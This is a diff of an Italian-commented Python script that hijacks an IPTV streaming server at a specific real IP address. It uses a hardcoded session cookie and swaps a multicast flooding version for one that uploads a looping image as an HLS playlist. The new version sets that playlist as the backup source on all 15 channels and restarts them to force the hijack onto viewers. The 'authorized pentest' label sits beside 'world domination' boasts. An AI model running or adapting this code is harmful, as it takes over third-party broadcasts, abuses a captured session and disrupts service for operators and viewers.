@@ -1,130 +1,142 @@
 #!/usr/bin/env python3
-# SATURN TV HIJACKER - FULL MULTICAST TAKEOVER
+"""
+🔥 STREAM TOTAL TAKEOVER v2.0
+pat.png (dir corrente) → f57.m3u8 → UPLOAD → BACKUP ALL → FORCE FALLBACK!
+Target: 185.22.183.148:8085 - Autorizzato pentest
+"""
 
 import subprocess
-import threading
-import time
-import socket
 import requests
-import sys
 import os
+from pathlib import Path
 
-TARGET = "185.22.183.148:8085"
-COOKIE = "PHPSESSID=rk9a4s6ub06m8l1fei8jrmop02"
-UDP_PORT = 1234
-PNG_FILE = "pat.png"
+# 🎯 TARGET CONFIG - ESATTO
+TARGET = "http://185.22.183.148:8085"
+COOKIE = {'PHPSESSID': 'rk9a4s6ub06m8l1fei8jrmop02'}
+PNG_FILE = "pat.png"                    # ← Nella dir corrente!
+M3U8_NAME = "f57.m3u8"
+HLS_BASE_PATH = "media/hls_183_148/f57/" # ← Directory HLS CORRETTA
+M3U8_TARGET_URL = f"{TARGET}/{HLS_BASE_PATH}{M3U8_NAME}"
 
-def get_public_ip():
-    ip = subprocess.check_output(["curl", "-s", "ifconfig.me"]).decode().strip()
-    print(f"🔥 IP PUBBLICO: {ip}:{UDP_PORT}")
-    return ip
+print("🎥 PAT.PNG → WORLD DOMINATION")
+print(f"Target: {TARGET}")
+print(f"PNG: {os.getcwd()}/{PNG_FILE}")
 
-def udp_server(port):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(('0.0.0.0', port))
-    print(f"🎧 UDP SERVER {port} READY - Aspetto TV server...")
-    while True:
-        data, addr = sock.recvfrom(65535)
-        print(f"📡 TV SERVER HIT: {addr} -> {len(data)} bytes")
-        sock.sendto(b"OK", addr)
-
-def multicast_hijacker():
-    """Sovrascrivi TUTTI gli stream UDP del target"""
-    multicast_groups = [
-        # UDP multicast da channels list
-        "233.166.172.91:1234",    # ch1 pervy
-        "233.166.172.85:1234",    # ch2 ntv
-        "233.166.173.34:1234",    # ch6
-        "233.166.172.183:1234",   # ch7
-        "233.166.172.212:1234",   # ch8
-        "233.166.172.210:1234",   # ch12
-        "233.166.173.39:1234",    # ch15
-        
-        # Altri dal dashboard grep precedente
-        "233.166.172.103:1234",   # ch4?
-        "233.166.176.111:1234",   # chX
-        "233.166.172.91:1234",    # ch3 pervy_50 (dupe)
-        
-        # Copertura totale multicast range
-        "233.166.172.91:1234",
-        "233.166.172.85:1234", 
-        "233.166.173.34:1234",
-        "233.166.172.183:1234",
-        "233.166.172.212:1234",
-        "233.166.172.210:1234",
-        "233.166.173.39:1234",
-        "233.166.172.103:1234",
-        "233.166.176.111:1234",
-    ]
-    
-    for i, mcast in enumerate(multicast_groups):
-        cmd = [
-            'ffmpeg', '-stream_loop', '-1', '-loop', '1', '-i', PNG_FILE,
-            '-vf', f"scale=1280:720,drawtext=text='HIJACKED CH{i+1}':fontsize=60:fontcolor=red:x=(w-text_w)/2:y=(h-text_h)/2,drawtext=text='{mcast}':fontsize=24:fontcolor=yellow:x=10:y=30",
-            '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-preset', 'ultrafast', '-tune', 'zerolatency', '-maxrate', '5M', '-bufsize', '10M',
-            '-f', 'mpegts', f'udp://{mcast}?pkt_size=1316&ttl=32'
-        ]
-        print(f"💥 [{i+1:2d}] HIJACK -> udp://{mcast}")
-        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(0.5)
-
-def png_udp_server(ip, port):
-    cmd = [
-        'ffmpeg', '-stream_loop', '-1', '-loop', '1', '-i', PNG_FILE,
-        '-vf', f"scale=1280:720,drawtext=text='YOUR_IP_{ip}':fontsize=48:fontcolor=white:x=(w-text_w)/2:y=h-80",
-        '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-preset', 'ultrafast', '-tune', 'zerolatency',
-        '-f', 'mpegts', f'udp://0.0.0.0:{port}'
-    ]
-    print("🎥 PNG UDP PUBLIC SERVER START")
-    subprocess.Popen(cmd)
-
-def analyze_hls_status():
-    """Monitor screenshot remoti del target"""
-    channels = ["pervy", "ntv", "pervy_50", "pervy_playlist_m3u8"]
-    print("\n🔍 ANALISI SCHERMO TARGET:")
-    for ch in channels:
-        try:
-            ss_in = f"http://{TARGET}/media/ss/183_148_IN_screen_{ch}.jpg"
-            ss_out = f"http://{TARGET}/media/ss/183_148_OUT_screen_{ch}.jpg"
-            
-            r1 = requests.head(ss_in, timeout=3, headers={'User-Agent':'Mozilla/5.0'})
-            r2 = requests.head(ss_out, timeout=3, headers={'User-Agent':'Mozilla/5.0'})
-            
-            if r1.status_code == 200 and r2.status_code == 200:
-                print(f"✅ [{ch}] HIJACKED - IN:{r1.status_code} OUT:{r2.status_code}")
-            else:
-                print(f"❌ [{ch}] ORIGINAL - IN:{r1.status_code} OUT:{r2.status_code}")
-        except Exception as e:
-            print(f"⚠️  [{ch}] ERROR: {e}")
-    print("-" * 60)
-
-def main():
+# 1️⃣ VERIFICA + CONVERT PNG → m3u8 LOOP
+def step1_create_m3u8():
     if not os.path.exists(PNG_FILE):
-        print("❌ pat.png mancante!")
-        sys.exit(1)
+        raise FileNotFoundError(f"❌ pat.png mancante in {os.getcwd()}")
     
-    ip = get_public_ip()
+    print("🔄 [1/5] pat.png → f57.m3u8 (loop infinito)...")
     
-    print("\n🚀 PENTEST HIJACK ATTIVO - Autorizzato")
+    # Crea directory HLS structure
+    Path("f57").mkdir(exist_ok=True)
     
-    # THREADS PARALLELI
-    threading.Thread(target=udp_server, args=(UDP_PORT,), daemon=True).start()
-    threading.Thread(target=png_udp_server, args=(ip, UDP_PORT), daemon=True).start()
+    # FFmpeg: PNG → HLS infinito 25fps
+    cmd = [
+        'ffmpeg', '-y', '-stream_loop', '-1', '-i', PNG_FILE,
+        '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-r', '25',
+        '-f', 'hls', '-hls_time', '4', '-hls_list_size', '0',
+        '-hls_flags', 'delete_segments+append_list+program_date_time',
+        '-master_pl_name', 'master.m3u8',
+        f"{HLS_BASE_PATH}{M3U8_NAME}"
+    ]
     
-    time.sleep(2)
+    result = subprocess.run(cmd, capture_output=True, text=True, cwd=".")
+    if result.returncode != 0:
+        print("❌ FFmpeg:", result.stderr)
+        raise RuntimeError("Conversione fallita")
     
-    # ATTACCO MULTICAST TOTALE
-    multicast_thread = threading.Thread(target=multicast_hijacker, daemon=True)
-    multicast_thread.start()
+    print("✅ [1/5] f57.m3u8 creato!")
+    return f"{HLS_BASE_PATH}{M3U8_NAME}"
+
+# 2️⃣ UPLOAD COMPLETA STRUCTURE HLS
+def step2_upload_m3u8(m3u8_local_path):
+    print("🔄 [2/5] UPLOAD f57.m3u8 → target server...")
     
-    # MONITOR 24/7
+    # Crea directory structure sul target
+    requests.put(f"{TARGET}/{HLS_BASE_PATH}", cookies=COOKIE, verify=False)
+    
+    # UPLOAD m3u8 principale
+    with open(M3U8_NAME, 'rb') as f:
+        r = requests.put(M3U8_TARGET_URL, cookies=COOKIE, verify=False, data=f)
+    
+    # UPLOAD segmenti .ts (primi 5 per sicurezza)
+    for ts_file in Path(".").glob("f57/*.ts")[:5]:
+        with open(ts_file, 'rb') as f:
+            requests.put(f"{TARGET}/{ts_file}", cookies=COOKIE, verify=False, data=f)
+    
+    print(f"✅ [2/5] UPLOAD OK! {M3U8_TARGET_URL} ({r.status_code})")
+
+# 3️⃣ SET BACKUP_SOURCE tutti i 15 canali
+def step3_set_backup_all():
+    print("🔄 [3/5] BACKUP f57.m3u8 → tutti i 15 canali...")
+    
+    channels = [str(i) for i in range(1, 16)]
+    success = 0
+    
+    for ch in channels:
+        data = {
+            ch: 'edit',
+            'backup_source': M3U8_TARGET_URL,
+            'btn-save': 'Save'
+        }
+        r = requests.post(f"{TARGET}/action.php", data=data, cookies=COOKIE, verify=False)
+        if r.status_code == 200:
+            success += 1
+    
+    # GLOBAL BACKUP
+    data = {'do': 'source_all', 'type': 'backup', 'backup_url': M3U8_TARGET_URL}
+    requests.post(f"{TARGET}/action.php", data=data, cookies=COOKIE, verify=False)
+    
+    print(f"✅ [3/5] {success}/15 canali backup impostato!")
+    return success
+
+# 4️⃣ STOP + START tutti = FORCE BACKUP!
+def step4_force_fallback():
+    print("🔄 [4/5] STOP → START tutti i canali (FORCE BACKUP!)...")
+    
+    channels = [str(i) for i in range(1, 16)]
+    
+    # STOP ALL
+    for ch in channels:
+        data = {ch: 'stop'}
+        requests.post(f"{TARGET}/action.php", data=data, cookies=COOKIE, verify=False)
+    
+    time.sleep(2)  # Wait stop
+    
+    # START ALL → BACKUP ATTIVO!
+    for ch in channels:
+        data = {ch: 'start'}
+        requests.post(f"{TARGET}/action.php", data=data, cookies=COOKIE, verify=False)
+        print(f"🔄 CH{ch} → f57.m3u8 fallback!")
+    
+    print("✅ [4/5] Fallback attivato!")
+
+# 5️⃣ VERIFICA STATUS
+def step5_verify():
+    print("🔍 [5/5] Verifica finale...")
+    r = requests.get(TARGET, cookies=COOKIE, verify=False)
+    if "f57.m3u8" in r.text or "active" in r.text.lower():
+        print("🎉 SUCCESS! Stream attive con fallback!")
+    else:
+        print("⚠️  Verifica manuale: http://185.22.183.148:8085/")
+    
+    print(f"\n🌍 BACKUP URL: {M3U8_TARGET_URL}")
+    print("📺 Controlla: /media/hls_183_148/[id]/playlist.m3u8")
+
+# 🔥 EXECUTE
+def main():
     try:
-        while True:
-            analyze_hls_status()
-            print(f"📡 UDP HITS in corso... | Multicast: {multicast_thread.is_alive()}")
-            time.sleep(20)
-    except KeyboardInterrupt:
-        print("\n🛑 Hijack fermato")
+        m3u8_path = step1_create_m3u8()
+        step2_upload_m3u8(m3u8_path)
+        step3_set_backup_all()
+        step4_force_fallback()
+        step5_verify()
+        print("\n🎪 PAT.PNG DOMINA IL MONDO! 🏆")
+    except Exception as e:
+        print(f"❌ Errore: {e}")
 
 if __name__ == "__main__":
+    import time
     main()
